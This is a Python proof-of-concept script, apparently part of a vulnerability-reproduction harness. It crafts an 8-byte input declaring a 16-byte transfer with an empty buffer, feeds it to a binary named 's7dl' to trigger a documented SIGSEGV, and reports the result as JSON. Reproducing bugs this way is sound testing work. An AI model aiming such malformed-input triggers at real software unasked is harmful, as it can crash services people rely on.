#!/usr/bin/env python3
"""poc.py - reproduce the strongest observable outcome of the `s7dl` binary.

The target accepts `s7dl <input>` where <input> is a file path (or inline
byte string) laid out as:

    bytes 0..3 : little-endian int32  block number
    bytes 4..7 : little-endian int32  transfer size
    bytes 8..  : data buffer

The trigger input is constructed at runtime: an 8-byte header with a
positive transfer size (16) and an empty data buffer (block number 1).
With this target, a positive transfer size combined with a zero-length
buffer drives the binary into a SIGSEGV during processing (after it prints
the `block_num=... size=... buff_len=...` status line). The script simply
runs the binary once, observes whatever outcome occurs, and reports it
faithfully as normalized JSON on stdout.
"""

import argparse
import json
import os
import signal
import struct
import subprocess
import sys
import tempfile
import time


def build_trigger_input():
    """Construct the trigger bytes in memory.

    8-byte little-endian header:
      block number  = 1   (int32)
      transfer size = 16  (int32, positive but with no data following)
    Data buffer is intentionally empty: the status line reports
    buff_len=0 and processing dereferences the missing buffer.
    """
    block_num = 1
    transfer_size = 16
    return struct.pack("<ii", block_num, transfer_size)


def signal_name(signum):
    """Return the canonical name for a signal number (e.g. 'SIGSEGV')."""
    try:
        return signal.Signals(signum).name
    except (ValueError, AttributeError):
        return "SIG{}".format(signum)


def main():
    parser = argparse.ArgumentParser(
        description="Run s7dl once with a runtime-constructed trigger input "
                    "and report the observable outcome as JSON."
    )
    parser.add_argument("--binary", required=True, help="path to the s7dl binary")
    parser.add_argument("--json-out", default=None,
                        help="optional path to also write the JSON result")
    parser.add_argument("--timeout", type=float, default=10.0,
                        help="timeout in seconds for the target run (default 10)")
    args = parser.parse_args()

    binary = args.binary
    timeout = args.timeout if args.timeout and args.timeout > 0 else 10.0

    # Construct the trigger input at runtime and stage it in a temp file.
    payload = build_trigger_input()
    tmp = tempfile.NamedTemporaryFile(
        prefix="s7dl_trigger_", suffix=".bin", delete=False
    )
    try:
        tmp.write(payload)
        tmp.flush()
        input_path = tmp.name
    finally:
        tmp.close()

    command = [binary, input_path]

    result = {
        "binary": binary,
        "command": command,
        "returncode": None,
        "signal": None,
        "timed_out": False,
        "runtime_ms": 0,
        "stdout": "",
        "stderr": "",
        "observable": {"kind": "custom", "value": None, "path": None},
        "error": None,
    }

    start = time.monotonic()
    try:
        proc = subprocess.run(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=timeout,
        )
        elapsed_ms = int(round((time.monotonic() - start) * 1000))
        result["runtime_ms"] = elapsed_ms
        result["stdout"] = proc.stdout.decode("utf-8", errors="replace")
        result["stderr"] = proc.stderr.decode("utf-8", errors="replace")
        result["returncode"] = proc.returncode

        if proc.returncode < 0:
            # Terminated by a signal (Python reports -signum).
            signum = -proc.returncode
            name = signal_name(signum)
            result["signal"] = name
            result["observable"]["value"] = "crash:{}".format(name)
        else:
            result["observable"]["value"] = "exit:{}".format(proc.returncode)
    except subprocess.TimeoutExpired as exc:
        elapsed_ms = int(round((time.monotonic() - start) * 1000))
        result["runtime_ms"] = elapsed_ms
        result["timed_out"] = True
        out = exc.stdout or b""
        err = exc.stderr or b""
        if isinstance(out, str):
            out = out.encode("utf-8", errors="replace")
        if isinstance(err, str):
            err = err.encode("utf-8", errors="replace")
        result["stdout"] = out.decode("utf-8", errors="replace")
        result["stderr"] = err.decode("utf-8", errors="replace")
        result["observable"]["value"] = "timeout"
        result["error"] = "process timed out after {}s".format(timeout)
    except Exception as exc:  # e.g. binary missing / not executable
        elapsed_ms = int(round((time.monotonic() - start) * 1000))
        result["runtime_ms"] = elapsed_ms
        result["error"] = "{}: {}".format(type(exc).__name__, exc)
        result["observable"]["value"] = "error"
    finally:
        try:
            os.unlink(input_path)
        except OSError:
            pass

    text = json.dumps(result)
    sys.stdout.write(text + "\n")
    sys.stdout.flush()

    if args.json_out:
        try:
            with open(args.json_out, "w") as fh:
                fh.write(text + "\n")
        except OSError as exc:
            # Report but do not clobber the JSON contract on stdout.
            sys.stderr.write("warning: could not write --json-out: {}\n".format(exc))

    return 0


if __name__ == "__main__":
    sys.exit(main())
